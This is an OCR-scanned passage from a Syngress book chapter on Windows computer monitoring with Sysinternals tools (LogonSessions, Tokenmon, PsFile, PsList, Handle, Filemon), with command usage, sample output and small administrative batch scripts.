[4] Logon session 00000000:013e2094: 
User name: 
DEVELOPMENT\Administrator 
Auth package: NTLM 
Logon type: 
Service 
Session: 
0 
Sid: 
S-I-5-21-527237240-I13007714-839522115-500 
Logon time: 
4/1/2006 11:45:04 AM 
Logon server: DEVELOPMENT 
DNS Domain: 
UPN: 
[5] Logon session 00000000:013e4e03: 
User name : 
DEVDOMAIN\Administrator 
Auth package : Kerberos 
www.syngress.com 

Computer Monitoring 9 Chapter 4 
161 
Logon type: 
Session: 
Sid: 
Logon time: 
Logon server: 
DNS Domain: 
UPN : 
Network 
0 
S-I-5-21-329068152-688789844-1202660629-500 
4/1/2006 Ii:46:28 AM 
As you can see from the output, there are six active sessions on my computer, 
which is called Development. In the preceding section, sessions 0 through 2 are the 
implicit sessions that are created when Windows starts. 
Session 3 shows a user named Sysinternals who has logged on to a domain. We 
know this because a DNS domain is listed, as well as a logon type of Interactive. This 
information, and the fact that the authentication type is Kerberos, leads us to believe 
that the user is an authenticated Domain user. 
Session 4 shows a service using specific user credentials to log on to the com- 
puter when the service starts. We know this because the logon type is Service, which 
only services use. We also know that the user account is a local user rather than a 
domain user because the username shows the same computer name as the logon 
server. 
Session 5 shows a remote user authenticated to the local machine. We know this 
because the logon type is shown as Network. As discussed previously, when the 
logon type is Network, the user logged on over the network. 
Using Tokenmon to 
Monitor a User's Security Tokens 
In the preceding section, I touched briefly on access tokens and discussed how they 
are used to store security information for a user or process. In this section, I will 
expand on this information and introduce a tool called Tokenmon that explains how 
to view token activity in real time within a graphical interface. Before I discuss the 
use of this program, let's work our way through a brief introduction on tokens and 
why you would use them. 
What Is a Token? 
One of the basics of Windows security is that a process in Windows runs on behalf 
of a particular account, whether it's a user account or a system account, and inherits 
the privileges and permissions from that account. However, how does the operating 
system keep track of the privileges and permissions associated with a process? It does 
so through a kernel object called a token, or access token. 

162 
Chapter 4 9 Computer Monitoring 
A token is an object that contains the information about an account's particular 
security profile, which includes a user's SID, the SIDs of the groups the user belongs 
to, and other security information. When a user logs on to Windows, a unique logon 
session is created that identifies that user, and a token is created that refers back to 
this logon session. This token is the security context, or security information, for the 
account that just logged on. 
As stated before, any process that runs in Windows must run as the particular 
account that started it. When an account starts a program, the program inherits the 
rights of the access token used by the account that started it. Therefore, all processes 
running under a particular user also run using the same rights and privileges as that 
user.You can see an example of how processes are running as a particular user by 
viewing the Processes tab in the Windows Task Manager, as shown in Figure 4.1. As 
you can see, processes are running under different usernames. The processes that you 
started, or that were started by processes you started, will show your username. 
System services, on the other hand, will be running under various system accounts. 
Each of these processes runs under the security context of the particular username 
on whose behalf the process is running. 
Figure 4.1 Processes Running under Different Accounts in the Windows Task 
Manager 
Impersonation and Its Importance 
Now that you understand that all processes are running under the same security 
context as the user who started them, you may have realized that certain security 

Computer Monitoring 9 Chapter 4 
163 
risks are inherent with this security model. What happens if you run a program that 
has greater privileges than you do? Can you now interact with the operating system 
using these higher privileges? Yes, you can. 
I'll use an example to illustrate this better. Let's say that John wants to create a 
new directory on a network drive to which only the operating system and adminis- 
trators have access. Since John does not belong to either of these security groups, 
you would assume he could not create the folder. This is not necessarily the case, 
though. What if John was to try to create a folder using a server program that was 
running under the System account, which tends to have full access to the operating 
system? Now, John will have no problem creating the folder, as the program has the 
necessary permissions that John did not have. 
To fix the problem Windows uses a technique called impersonation. 
Impersonation means that a thread of a process changes its security context to be the 
context of the user running the program. As a result, the program has only the user's 
permissions, not those of the original creator. If you apply impersonation to the pre- 
ceding example, you will see how this alleviates the previous security risk. Now that 
the server process that John is connecting to impersonates John's security context, 
the program will be able to make folders only in locations that John has access to, 
not in the locations that the original permissions allowed. When John issues his 
command to create the folder, a thread of the process handling this request will 
impersonate John and will be unable to create the folder. 
Now that you have a good grasp on tokens and impersonation, let's move on to 
actually viewing this information in real time using Tokenmon. 
Configuring and Running Tokenmon 
Tokenmon is a graphical program that allows you to see the real-time activity of the 
access tokens on your computer. To install Tokenmon, simply download it from 
www.sysinternals.com/Utilities/Tokenmon.html and extract the Tokenmon.exe file 
to a location on your hard drive. When you are ready to run it, simply double-click 
on Tokenmon.exe to start the program. When the program starts, you will see a 
screen similar to the one in Figure 4.2. It is important to note that Tokenmon 
requires the account running it to have administrator privileges due to the security- 
related hooks it must use. 
www.syngress.com 

164 
Chapter 4 9 Computer Monitoring 
Figure 4.2 The Tokenmon Interface 
The Tokenmon screen is split into three sections consisting of the menu bar, the 
toolbar, and the listview. The menu bar contains items for configuring the program's 
output. The toolbar contains access to quick actions you want to perform, and the 
listview is where the program's output is displayed. By default, when you start the 
program it will automatically begin capturing token activity. If you want to pause 
the capture process, click the magnifying glass icon; when you are ready to start cap- 
turing again, click the button again. Now that you know how to use the program, 
let's learn how to interpret the output. 
To make it easier to follow the timeline of the activity shown in the listview, you 
should select the Options I Clock Time menu item so that there is a checkmark 
next to the Clock Time option. This will display each activity with the time that it 
occurred, instead of showing the default display of the number of seconds since you 
started the program. Seeing the actual time when an activity occurred will make it 
easier to determine what is causing the listed events. 

Computer Monitoring 9 Chapter 4 
165 
Understanding Tokenmon's Output 
A request to use, modify, or manipulate a token will appear in real time in the 
listview. As shown in Figure 4.2, Tokenmon displays this activity in seven columns. I 
describe their contents in the following subsections. 
# 
Each entry in the listview is numbered sequentially, with the first entry starting at 
one. 
Time 
Tokenmon displays the Time column in two ways. The default method is the stop- 
watch. In stopwatch mode, the column will display the number of seconds that have 
elapsed since you started Tokenmon or cleared the listview when the particular 
activity occurred. The second method is clock mode, which shows the actual time 
that the entry took place. I find that clock mode is more useful when trying to diag- 
nose problems. 
Process : ID 
This column shows the actual process name that is accessing the Registry, followed 
by its process ID (PID). For example, if the process was regedit.exe:1521, the process 
name would be regedit.exe and its PID would be 1521. 
Thread ID 
This column shows each thread, represented by a unique ID. 
Request 
The Request column shows the actual activity that is taking place on the token. 
Table 4.4 lists common requests that you will see in this column. 
www.syngress.com 

166 
Chapter 4 ~ Computer Monitoring 
Table 4.4 Types of Requests 
Type of Request 
IMPERSONATE CLIENT OF PIPE 
IMPERSONATE 
REVERTTOSELF 
ADJUST PRIVILEGES 
CREATEPROCESS 
EXITPROCESS 
LOGON 
LOGOFF 
Description 
A process is impersonating a named pipe. 
A process is impersonating another user. 
A process will revert to its primary iden- 
tity after impersonating another user. 
The processes are enabling a required 
privilege. 
A new process was created. 
A process was closed. 
A new Iogon session was created because 
an account logged on to the system. 
A Iogon session was closed because an 
account logged off the system. 
Logon ID" \R)omain\User 
This is the primary identity of the process. This username is the security context that 
all programs that the program launches will use. 
Other 
This column contains more information about the request that is taking place. 
Common entries you will find in this column include: 
9 
LUID:\\Domain\User 
When this username appears in the Other 
column, it represents the user that the process is currently impersonating. 
9 
Parent You will see this when the request is a CREATEP1KOCESS. This 
represents the name of the process and the PID that created the process.An 
example is Parent: explorer.exe:292. 
9 
Enabled When you see an Enabled statement it means that the token has 
enabled a particular privilege. Privileges are turned on only when they are 
required in order to prevent a process from performing a security task by 
mistake. Table 4.5 lists common enabled privileges. 

Computer Monitoring 9 Chapter 4 
167 
Table 4.5 Common Privileges Enabled by Tokens 
Privilege 
What It Allows 
AUDIT 
DEBUG 
LOAD DRIVER 
UNDOCK 
Allows the particular service to send events to the 
event log. 
Allows a process to access any other process, 
regardless of security permissions. 
Allows the process to load and unload device 
drivers. 
Allows a process to remove the computer from a 
docking station or to eject a removable piece of 
hardware so that it can be removed safely. 
Setting Up Filters 
Tokenmon allows you to filter output based on the process using the token, by using 
the Edit I Filter/Highlight menu item. To add a filter you type the name of a 
process, or a string that multiple processes begin with, into the field you want to use. 
If you want to use a wildcard, you can enter an asterisk.You can add multiple filters 
by separating them with a semicolon. It is important to note that when making fil- 
ters, you cannot use the wildcard by itself in the Exclude field. As the wildcard is the 
most general filter, it will override any Include filters you have and will not show 
any token activity. If you want to be able to see activity that matches a specific 
string, leave the Exclude filter blank and just add the process to the Include filter. 
Table 4.6 lists some example filters to help you on your way. 
Table 4.6 Setting Up Filters with Tokenmon 
Type of Filter 
Code 
Only token activity for Firefox.ex 
Only activity that contains the 
string Impersonate 
All activity except for the ones 
that contain the string 
Impersonate Include: 
* 
Only CREATE PROCESS requests 
Include firefox, exe* 
Exclude : 
Include- 
*impersonate* 
Exclude : 
Exclude: 
*impersonate* 
Include: 
*Create 
Process* 
Exclude : 

168 
Chapter 4 9 Computer Monitoring 
Practical Uses of Tokenmon 
Now that you understand how to use Tokenmon and what its output means, let's go 
over some of its practical uses: 
9 
Monitor logons and logoffs Set a filter to show only these two events 
and you will be able to see a history of services, scheduled jobs, and local 
and remote users that are logging on to the local computer. 
9 
Determine what applications are enabling certain privileges This is 
helpful when you want to diagnose problems where certain system settings 
have changed and you do not know what caused the changes. 
9 
Monitor process creation and termination This will allow you to 
generate a history of processes being created and terminated. This is espe- 
cially useful on machines that generally have no local usage, as you can spot 
irregular activity. 
9 
Monitor impersonation This will enable you to find processes that are 
impersonating other users. 
Finding Open Resources and the 
Processes That Are Accessing Them 
The quantity of resources used on a computer can adversely affect the computer's 
performance. It is therefore important to monitor which programs are using too 
much memory, are using too much of the CPU, or have too many files open. By 
knowing what is running on your machine and how it is utilizing your resources, 
you can efficiently optimize your computer so that only necessary programs run. In 
this section, I will cover three tools that allow you to monitor the resources your 
computer uses. 
Using PsTools to 
Examine Running Processes and Files 
PsTools is not a single tool, but rather, a package of individual command-line tools 
capable of performing a specific task. Two of its tools, PsList.exe and PsFile.exe, 
monitor local and remote resource usage extremely efficiently.You can download the 
complete package of PsTools from www.sysinternals.com/Utilities/PsTools.html. If 
you want to download the individual tools rather than the whole package, that link 
also contains links to the download pages of the individual programs. 

Computer Monitoring 9 Chapter 4 
169 
In this section, we'll give a brief overview of how to use these programs, and then 
we'll work through some example PsFile scripts that will make your lives easier. 
Remotely Monitoring Open Files with PsFile.exe 
PsFile is a command-line-driven console program that allows you to view as well as 
close files that are open on a remote computer. This is an extremely powerful utility 
for a system administrator, as you can script it using batch files to perform various 
functions for you automatically. 

170 
Chapter 4 9 Computer Monitoring 
PsFile lists only a few command-line arguments, as shown here (you can find 
this same usage information by typing PsFile.exe -? at the command prompt): 
PsFile vl.01 - local and remote network file lister 
Copyright (C) 2001 Mark Russinovich 
Sysinternals - www.sysinternals.com 
PsFile lists or closes files opened remotely. 
Usage: psfile [\\RemoteComputer 
[-u Username 
[-p Password] ] ] 
eli 
-u 
-p 
Id 
Path 
-c 
Specifies optional user name for login to 
remote computer. 
Specifies password for user name. 
Id of file to print information for or close. 
Full or partial path of files to match. 
Closes file identified by file Id. 
[[Id I path] 
_ 
Omitting a file identifier has PsFile list all files opened remotely. 
The simplest use of PsFile is to run it without any arguments. This will create a 
list of files on the local computer that were opened remotely. To view the list of 
open files on a remote computer you need to add a Windows universal naming con- 
vention (UNC) to the command line, like so: 
psfile, exe \\server 
As long as you have permission on the remote computer, it will list the files. If 
you do not have permission, you will need to enter a remote username and pass- 
word on the command line, like so: 
psfile, exe \\server -u ausername -p apassword 
As long as the given credentials are legitimate, the list of open files will be 
displayed. 
One of the strongest aspects of this tool is its capability to close files that are 
opened remotely on a computer. PsFile can close a file based on either its file handle 
or its path.You can determine the handle for a particular file by running PsFile.You 
can then use the -c argument to close the file. For example, to close a file whose 
handle is 6531, you type this: 

Computer Monitoring 9 Chapter 4 
171 
psfile \\server 6531 -c 
To close a file based on its path, you type something like this: 
psfile \\server c:\data -c 
When closing files based on their paths, it is important to note that if a path 
contains spaces, you must enclose that path in quotes. For example, the following 
will not work: 
psfile \\server c:\my data -c 
Instead, you need to issue the command like so" 
psfile \\server "c:\my data" -c 
Understanding PsFile's Output 
Now that you understand how to use PsFile, let's look at its output and figure out 
what it is telling us. Here is the output from a run of PsFile against my development 
server: 
Files opened remotely on server: 
[3009] \\PIPE\\llsrpc 
User: 
JUPITER$ 
Locks: 
0 
Access: Read Write 
[5047] D:\\Data\\Shared\\docs\\networks.doc 
User: 
Sysinternals 
Locks: 
0 
Access: Read Write 
[5048] D:\\Data\\Shared\\docs\\list.xls 
User: 
Sysinternals 
Locks: 
20 
Access: Read Write 
[5490] D:\\Data\\DB\\database.mdb 
User: 
Jeff 
Locks: 
0 
Access: Read Write 
[5492] D:\\Data\\DB\\database.ldb 
User: 
Jeff 
Locks: 
22 
Access: Read Write 

172 
Chapter 4 9 Computer Monitoring 
From the output, we can see that five files were opened remotely on the Server 
computer, each one with a different file handle. The file handle is the number 
between the brackets, [ ], on the same line as the filename. The User: line is the name 
of the user who is using the file. The Locks are the number of file locks set on that 
file, and Access denotes the type of access used to open the file. 
In the aforementioned output, you may have noticed an open file that does not 
appear to be a standard file.That file, named \\PlPE\\llsrpc, represents a named pipe, 
which is a named connection that you can use to transfer data between two com- 
puters. This particular pipe represents the License Logging Service that is running on 
the Server computer. The file handle shows that the computer Jupiter is connecting 
over this named pipe to the running service. 
Monitoring Processes with PsList.exe 
Now that you know how to list and manage opened files on remote computers, let's 
learn how to monitor running processes on both local and remote computers. Being 
able to manage the processes running on your computers is essential for keeping 
your computers running efficiently, and for being able to monitor their security. By 
routinely monitoring the processes on a computer, you can easily spot programs that 
should not be running or processes that may be utilizing too much of the CPU. 
Security and CPU utilization are not the only important aspects of running pro- 
cesses, though. When a process runs, it uses memory. PsList allows you to examine 
the type and amount of memory the processes are using, which allows you to deter- 
mine whether any of the processes are experiencing memory leaks or are just taking 
up too much memory. Efficiently managing how memory is used on a computer 
can make a huge difference in how efficiently the computer runs. 
Using, the PsList Command-Line 
Arguments and Understanding Their Output 
PsList is a command-line console program that has several different arguments that 
can change how output is displayed. Therefore, I will spend extra time explaining the 
various options and their meanings.You can pull up the following syntax from the 
program by typing pslist -? at the command prompt: 
Usage: pslist [-d] [-m] [-x] [-t] [-s [n] [-r n] [\\computer 
[-u username] 
[-p password] [namelpid] 
-d 
Show thread detail. 
-m 
Show memory detail. 
-x 
Show processes, memory information and threads. 
-t 
Show process tree. 

Computer Monitoring 9 Chapter 4 
173 
-s [n] 
-r 
n 
\\computer 
-U 
-p 
necessary. 
name 
pid 
Run in task-manager mode, for optional seconds specified. 
Press Escape to abort. 
Task-manager mode refresh rate in seconds (default is i). 
Specifies remote computer. 
Optional user name for remote login. 
Optional password for remote login. If you don't present 
on the command line pslist will prompt you for it if 
Show information about specified process. 
Show information about specified process. 
All memory values are displayed in KB. 
Abbreviation key: 
Pri 
Priority 
Thd 
Number of Threads 
Hnd 
Number of Handles 
Mem 
Working Set 
VM 
Virtual Memory 
WS 
Working Set 
WS Pk 
Working Set Peak 
Priv 
Private Memory 
Faults 
Page Faults 
NonP 
Non-Paged Pool 
Page 
Paged Pool 
PageFile 
Page~le usage 
Cswtch 
Context Switches 
When running PsList, you can have it default to showing you a list of all the 
processes, or you can specify the particular process or PID that you want to show. To 
do this, first run PsList to get a list of the processes and then determine the PID of 
the process you want to show. To have PsList show information for only that partic- 
ular PID, add that PID as an argument. For example, to list the thread information 
for the process with a PID of 500, enter pslist 500 -d. If you do not want to list 
the process by its PID, you can use a name as the argument. For example, if you 
want to list all processes that start with the string note you can type pslist note. 
Remember that this will show all processes that start with note, including notepad, 
notebook, and just plain note. 
PsList provides three categories of information that you can display on the pro- 
cesses running on a computer. These categories represent general information about 
www.syngress.corn 

174 
Chapter 4 9 Computer Monitoring 
the processes, information about the processes' threads, and memory utilization for 
each process. When you run PsList without any arguments, it will default to dis- 
playing general information about each process, in nine columns containing infor- 
mation about each thread. Here is an explanation of what you'll find in each 
column: 
Name Name of the process. 
PID Systemwide unique ID of the process. 
Thd Current number of threads for the process. 
Pri Current priority of the process. When the operating system executes 
threads, it runs those threads that have the highest priority first. These 
threads receive their priority by inheriting it from the parent process. When 
there are no more threads in a higher priority, it will execute the threads 
that have lower priority. The standard priorities include Realtime (24), High 
(13), Normal (8), and Idle (4). 
Realtime (24) is the highest possible priority. Processes should never 
run all the time at this priority, as it can affect the performance of other 
applications. Instead, processes should switch to this priority only if they 
have a crucial task. 
High (13) includes threads that need to be run immediately. Threads 
that run at this priority should do so for only short periods. 
Normal (8) is the default priority for processes. 
Idle (4) are processes that should execute only when the system is 
idle. 
9 
Hnd The process handle. This handle does not have to be unique. 
9 
Mere The amount of memory currently allocated in RAM for the pro- 
cess. 
User Time The length of time that the process used the CPU to execute 
user calls and functions. 
9 
Kernel Time The length of time that the process used the CPU to exe- 
cute system calls and functions. 
9 Elapsed Time The total length of time that the process has been running. 
The Threads category, which you can display with the -d argument, displays 
information about the threads belonging to each running process. Each process, as 

Computer Monitoring 9 Chapter 4 
well as its associated PID, is listed, followed by seven columns with information 
about each thread that the process owns. Here is an explanation of what you'll find 
in each column: 
9 
Tid The thread ID. 
9 
Pri The thread's current priority. 
9 
Cswtch The number of times the operating system saved this thread's state 
and started processing another thread. 
9 
State The current execution phase of the thread. Common states are 
Ready, Running, and Wait. In the Ready state, the thread is ready to run. In 
the Running state, the thread is executing. In the Wait state, the thread is 
waiting for various reasons.You can find a list of the Wait reasons by 
searching on www.msdn.com for ThreadWaitReason Enumeration. (See 
http://msdn.microsoft.com/library/ 
e nus / cp re f/h tml/frlrfsys tem diagn os ti csthreadwai treason classt o p i c. asp). 
9 
User Time The length of time the thread used the CPU to execute user 
calls and functions. 
9 
Kernel Time The length of time the thread used the CPU to execute 
system calls. 
9 
Elapsed Time The total length of time the thread has been running. 
The Memory category, which you can display with the -m argument, displays 
memory information about each process. This information is broken down into the 
following 10 columns: 
9 
Name The process's name. 
9 
PID The process's system-wide unique ID. 
9 
VM The amount of virtual memory that the process is using. Virtual 
memory refers to utilizing the disk space on your computer to act as 
memory. 
9 
WS The amount of physical memory allocated to a process. 
9 
WS Pk The peak amount of memory this process uses. 
9 
Priv The amount of memory allocated to the process that another process 
cannot use. 
175 

176 
Chapter 4 9 Computer Monitoring 
9 
Faults The number of times the thread tried to access memory that is cur- 
rently not present in the physical RAM. The operating system will read that 
particular page of information back into memory. 
9 
NonP The amount of memory that is not allowed to be paged to the 
pagefile. 
9 
Page The amount of memory allocated to the process that is allowed to 
be paged to the pagefile. 
9 
PageFile The amount of memory that is currently stored in the pagefile 
for this process. 
If you want to list all the information possible for a process, you should use the 
-x argument. This will display the processes, along with all of their memory and 
thread information. 
The last argument that I will go over is-s. This argument will start PsList in 
task-manager mode, which lists the processes on your screen and refreshes the informa- 
tion until you exit the program. 
PsList makes it very easy to monitor processes on a remote server by specifying a 
Windows UNC as an argument to PsList. This will start PsList and output the list of 
processes specified in the UNC. This is even more useful when applying the -s argu- 
ment, as you can now keep a list of processes from another computer constantly 
refreshing on yours. If you are trying to connect to a remote computer and you do 
not have privileges to access the computer remotely, you can use the -u and -p 
arguments to specify a username and password, respectively, which will provide you 
with that access. 
Real-World Examples 
Although it is useful to learn the theory behind PsFile and PsList, it is also important 
to learn how to use these programs in real-life situations. In this section, I will pro- 
vide some simple batch files that will allow you to use these programs to make your 
life easier, and to make the computers they operate on run more efficiently. 
Resetting an Application H4 en It Uses Too Muck Memory 
In my office, we used a custom legacy application that had a memory leak. After we 
used this application for an extended period, we usually noticed that our server was 
running at a crawl and that this process was using much more memory than it 
should. As a result, our administrators had to monitor this process constantly and 
reset it when the process was using too much memory. Our administrators were too 
busy to spend time monitoring these particular processes. To make their lives easier, 

Computer Monitoring 9 Chapter 4 
177 
we put together a script utilizing PsList and PsKill, a Sysinternals script that you can 
use to kill local and remote processes. We created a batch file called killproc.bat and 
added the following text: 
for /F "tokens=l,2,3,4 skip=V" %%a in ('c:\bin\pslist.exe -m') do if /i 
%%a==tlasrv set size=%%d && goto tlasrv 
goto end 
:tlasrv 
if %size% GTR 102400 pskill tlasrv 
:end 
When run, this batch file checks each process name in the list of processes that 
the pslist-m command outputs. If it finds the tlasrv process, it will assign the size of 
its working set to the variable size and will go to the tlasrv routine. In this routine, it 
checks whether the size of the allocated memory is greater than 100 MB. If it is, it 
kills the process. 
Monitoring the Computers in a Domain 
for a Particular Process and Alerting the Administrator 
One of my clients had an application that he had to close at night before another 
application could run. If he did not close this application, the other application 
would not be able to work properly and would create extra work for the next day. 
As no one likes extra work, we came up with a script utilizing PsList and the net 
view command in order to make sure the administrator was notified that the process 
was running at the end of the day. To use this script, we entered the following text 
into a batch file and then scheduled it with the at command: 
@echo off 
for /F %%i in (\'net view ^Ifindstr \"\\\\\"\') do echo %%i >> computers.txt 
for /F %%i in (computers.txt) do for /F %%n in (\'pslist %%i updindx\') do 
if /i %%n==updindx net send sysadmin Updindx running on %%i 
del computers.txt 
This script works by taking the output of the net view command and filtering it, 
leaving us with a text file called computers.txt that contains all the active computers 
in the domain. We then use another for loop to run pslist on each of these com- 
puters. If we see a process called updindx when we're examining the output of 

178 
Chapter 4 9 Computer Monitoring 
pslist.exe, the script sends a message to the sysadmin user stating that the process is 
running on that machine so that they can exit it gracefully. 
Closing All Open Files on a Remote 
Computer That Reside in a Particular Path 
It is very common for files to be eliminated from a nightly backup because those 
files were left open.You can use PsFile to close all open file handles on a remote 
computer based on its path. If you know that all the data you want to back up is 
located in a particular directory, and you can close any file there without fear of 
losing data, you can use the following command: 
psfile \\server d:\data\docs -c 
This command will close every file that is under the path d:\data\docs so that 
the system backs it up properly. 
Using Handle to Determine 
What Local Files a User Has Open 
Have you ever wanted to know what files or directories are open and what processes 
are using them? Handle is a tool that allows you to do that, and more.You can use 
Handle for numerous purposes. From determining what files a piece of malware is 
using, to seeing open handles in the Registry, to seeing what process is keeping that 
file you're trying to delete open, Handle can pretty much do it all. 
Now that you know what this program can do, you may be wondering why it is 
called Handle rather than something like OpenFile. The reason is that even though 
Handle's most common uses are to see what processes are using a file or directory, it 
was designed to list all open handles on a computer, not just file handles. For those 
who may not know what a handle is, let's dig down even deeper. 
When a process uses a resource on your computer, whether it is a physical 
resource such as a printer or a logical resource such as a process, Windows creates a 
runtime structure called an object that designates this particular resource. The type of 
object created depends on the type of resource being used. For example, there are 
process, thread, token, and file objects, among many other types. Once the object is 
created, Windows will assign a handle to it so that you can differentiate this partic- 
ular resource from another one. Now when a particular process or other subsystem 
wants to access this resource again, it just needs to use the handle ID that was 
assigned. When a process has completed and then closes, the handles this process is 
using will close as well. It is important to note that the number used to represent a 
www.syngress.com 

Computer Monitoring 9 Chapter 4 
179 
handle does not have to be unique systemwide. Therefore, two processes can have 
the same handle number but have it point to different objects. 
Handle.exe is designed to list all handles found on your computer. For the most 
part, when using this program you will only want to manipulate file handles. This is 
because closing other types of handles, when you should leave them alone, can cause 
system or application instability. Now that we have the theory out of the way, let's 
learn how to use the program. 
Downloading and Using Handle 
Handle, like many of the other Sysinternals tools, is a command-line console pro- 
gram. To use it you must first download it from 
www.sysinternals.com/Utilities/Handle.html and extract it to your hard drive. Once 
you have extracted the file, you can run it from a console prompt. 
The default output, when providing no arguments to the program, is to see each 
process and the handles it has open. If you want to see more information or search 
for particular handles, you will need to use the program's command-line arguments. 
To see the list of available command-line arguments, as shown here, you simply need 
to type Handle.exe -? and press Enter: 
usage: handle [[-a] [-u] ] [-c <handle>] 
[ [-s]] [-p <process>l<pid>] 
[name] 
-a 
Dump all handle information. 
-c 
Closes the specified handle (interpreted as a hexadecimal number). 
You must specify the process by its PID. 
WARNING: Closing handles can cause application or system 
instability. 
-s 
Print count of each type of handle open. 
-u 
Show the owning user name when searching for handles. 
-p 
Dump handles belonging to process (partial name accepted). 
name 
Search for handles to objects with <name> (fragment accepted). 
No arguments will dump all file references. 
For the most part, you will be running Handle.exe without any arguments. This 
will allow you to see all of the processes and the file handles they have open. When 
displaying the output, Handle will display each process and its handles separated by a 
line of hyphens. Here is some sample output from Handle. I have edited the output 
to show only the single process, winword.exe, and to make it more readable. If you 
did this on your computer with Word open, you would see many more handles for 
the process than what I show here. I used the Handle.exe command to display this 
output. 

180 
Chapter 4 9 Computer Monitoring 
WINWORD.EXE pid: 440 DEVDOMAIN\sysinternals 
178: File 
C:\Documents and 
Settings\Sysinternals.DEVDOMAIN\Application 
Data\Microsoft\Templates\Normal.dot 
188: File 
C:\DOCUME-I\SYSIN-I.DEV\LOCALS~I\Temp\~DFB28B.tmp 
18C: Section 
\BaseNamedObjects\DFMap0-701079 
IA0: Section 
\BaseNamedObjects\DfSharedHeapAB340 
618: File 
D:\things i forget_to_do.doc 
As you can see, a line of hyphens separates each process and its associated han- 
dles. Right after the first line is a line of text that corresponds, in order, to the pro- 
cess name, the PID, and the user under whom the process is running. Underneath 
the process information is a list of each handle that this process opened. This infor- 
mation, in order, is the handle represented by a hexadecimal number, the type of 
object to which it is a handle, and the name of the object it represents. 
So, for the preceding example, we are looking at the WINWORD.EXE process 
with a PID of 440 and running under the user DEVDOMAIN\sysinternals.This 
particular process has five handles open. Three handles are to files that consist of the 
default Word template, a temp file, and the actual file that is being edited by Word. 
The other two are handles to an object type called a Section. 
By default, when running Handle with no options, it shows only file handles. To 
display a list of processes with handles for all object types you can use the-a com- 
mand-line argument. This will create a much larger listing of handles, so use it 
with care. 
If you want to list only the processes that match a particular name, or if you 
want to start with a particular string of text, you can use the -p command-line argu- 
ment. Using the -p argument followed by a string will list only those processes that 
match or begin with that particular string. For example, typing handle.exe -p win 
will list the winword.exe and winlogon.exe processes. 
As stated earlier in this chapter, Handle also can list object handles other than file 
handles, by using the -a argument. If you want to display a list of each object type 
and the number of times a handle to this type exists, you can use the-s command- 
line argument. 
www.syngress.com 

Computer Monitoring 9 Chapter 4 
181 
Searching for Handles 
One of Handle's most powerful features is its capability to search the list of handles 
for a particular string. As Handle produces a great deal of information, and sorting 
through this information can be time consuming, you can add a string of text for 
which you want to search the list of handles by appending it to the handle.exe com- 
mand. Handle will then search the name of each handle and list only those handles 
that match this name. For example, to find all open files that end with the extension 
.doc, you would type handle.exe .doe.This produced the following output on my 
computer: 
WINWORD.EXE 
pid: 440 
49C: D:\things i forget_to_do.doc 
WINWORD.EXE 
pid: 440 
69C: c:\networks\network_descr.doc 
How handy is that? If you want to add to the output the username under which 
the process is running, you can include the -u argument when running Handle.exe. 
Closing Handles 
It is great that we can list all the handles associated with a process, but let's get to the 
real fun: closing the handles. As stated before, each handle is associated with a hexadec- 
imal number that represents that handle. With that number and the particular process, 
you can close that handle. Note, however, that Handle allows you to close any handle 
on the operating system; even ones to which you are not supposed to have access. 
Therefore, if you close a handle that a user should not normally be able to access, there 
is a good chance of either system or application instability. So please, when using the 
Handle program to close a handle, make sure you have all your data saved. 
To close a handle you need to use the-c argument in conjunction with the -p 
argument.You use the -c argument to specify the handle number that you want to 
close and the -p argument to designate the process to which this handle belongs. For 
example, to close the handle 7F4 in a process represented by PID 4702 you would 
type handle.exe -c 7F4 -p 4702 and respond "yes" when asked whether you are 
sure that you want to close the handle. 
You may be wondering why you need to specify the PID. If you remember, the 
numbers used to represent a handle are not unique. They are unique only within the 
same process, but they are not unique systemwide. That means that a handle with the 
number 7F4 in one process does not point to the same object as the handle 7F4 in 
another process. 

182 
Chapter 4 9 Computer Monitoring 
Real-World Example 
Nothing is more frustrating than being unable to delete a file that you want to 
delete. How many times have you uninstalled a program and been unable to delete 
the directory because something was still accessing it? How often have you been 
cleaning out your temp folder and were unable to determine what was using that 
last .tmp file so that you can delete it? 
Handle is the perfect application for these types of situations. Simply run Handle 
and search for the file or directory that you want to delete. Once you find it, close 
the handle and then delete the file. As always, be careful when doing things like this, 
as closing a handle in this way may cause problems. 
Viewing All File Activity with Filemon 
Handle can show you what processes have a particular file open, but how do you 
determine what program is accessing, deleting, or creating files once a handle is 
closed? The answer is Filemon. Filemon is a graphical program by Sysinternals that 
allows you to see the real-time file, network, and named pipe activity on your com- 
puter. In this section, I will discuss how to use Filemon to diagnose problems that 
you may be having with various files or directories on your computer. 
Using Filemon to Monitor 
Real-Time File System Activity 
You can download Filemon from Sysinternals' Web site at 
www.sysinternals.com/Utilities/Filemon.html. Once you've downloaded the pro- 
gram, extract it to your hard drive and start filemon.exe to launch the program. 
When run, Filemon will automatically begin capturing file activity on the computer. 
It will display this activity in a portion of the window called the listview. Figure 4.3 
shows the Filemon window and its different sections. 

Computer Monitoring 9 Chapter 4 
183 
Figure 4.3 The Filemon Interface 
The Filemon window is very similar to the Tokenmon screen. It too is divided 
into three sections. The first section is the menu bar, which you use to change the 
program's various configuration options. The second section is the toolbar, which 
you use to perform quick actions such as halting/starting the capture process, 
saving/opening a log, and opening the filter menu. The third section, and the largest 
of the three, is devoted to the listview. The listview is where Filemon displays all of 
the file activity in real time. 
To start capturing file system activity you simply need to start Filemon. To stop 
capturing activity you click the magnifying glass button on the toolbar so that it has 
a red slash through it. To resume capturing just click the magnifying glass button 
once more. 
Filemon displays new activity as an additional line in the listview. If you want to 
open the directory containing the file that is part of that activity, you can double- 
click on that line. Filemon will then open the corresponding folder for that file. 
If you want to copy any of the lines of activity from the listview into your clip- 
board, simply highlight each line you want to copy and press Ctrl+C. These lines 
will be copied into the Windows clipboard; from there, you can paste the lines into 
another program. To delete lines of output, simply select the lines you want to delete 
and press the Delete key. Filemon will remove the lines from the listview. 

184 
Chapter 4 9 Computer Monitoring 
Configuring Filemon 
Now that you know how to use Filemon, let's set it up so that it is optimally config- 
ured. Although Filemon offers only a few configuration options, you need to make 
sure that certain options are set for optimal performance and ease of use. Table 4.7 
shows the configuration options in Filemon's Options menu, and it explains what 
to set them to in order to make the program's output easier to use and understand. 
Table 4.7 Optimal Filemon Configuration Settings 
Configuration Option 
Autoscroll 
*Clock Time 
www.syngress.com 
Setting and Description 
Enabled. By enabling this setting, you can 
follow the real-time activity of the Registry 
with the latest activity being shown at the 
bottom of the listview. 
Enabled. When you enable this option, 
each entry will be time-stamped so that you 
know the exact time the Registry activity 
occurred. This is useful for monitoring 
accesses to the file system. 
Disabled. By disabling this setting, you will 
display the duration of the specific activity. 
This is a good setting to use if you are 
developing an application and want to test 
